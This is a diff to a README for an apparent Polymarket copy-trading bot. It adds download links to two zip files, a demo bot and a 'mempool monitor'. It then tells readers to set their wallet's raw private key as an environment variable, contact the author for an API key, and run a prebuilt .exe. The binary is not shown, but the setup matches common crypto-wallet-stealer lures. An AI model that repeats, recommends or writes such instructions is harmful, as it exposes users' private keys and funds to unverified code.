@@ -20,7 +20,18 @@ https://polygonscan.com/tx/0x7f3552f2da30d362c68afe885b8c7a64e38a19e59b5872b4025
 ## Trial Versions
 
 ### **Polymarket Copy Trading Bot - Rust (Demo)**  
-> 🗂️ Comin' soon..
+- 🗂️ [polymarket_copytrading_bot_demo.zip](https://github.com/user-attachments/files/24639348/polymarket_copytrading_bot_demo.zip)
+- 🗂️ [mempool_monitor.zip](https://github.com/user-attachments/files/24639353/mempool_monitor.zip)
+
+### How To Run
+1. Environment Variables Settings
+   ```
+    PRIVATE_KEY= # Your wallet's private key (64-character hex string, no 0x prefix).
+    FUNDER_ADDRESS = # Your 40-character hex wallet address (with or without 0x), matching your PRIVATE_KEY.
+    TARGET_WHALE_ADDRESS= # The whale address you want to copy trades from (40-character hex, no 0x prefix).
+    ALCHEMY_API_KEY= # WebSocket RPC Provider (Alchemy is recommended for beginners, Contact me for this API key).
+   ```
+3. Run `polymarket_copytrading_bot_demo.exe`
 
 ## Features
 
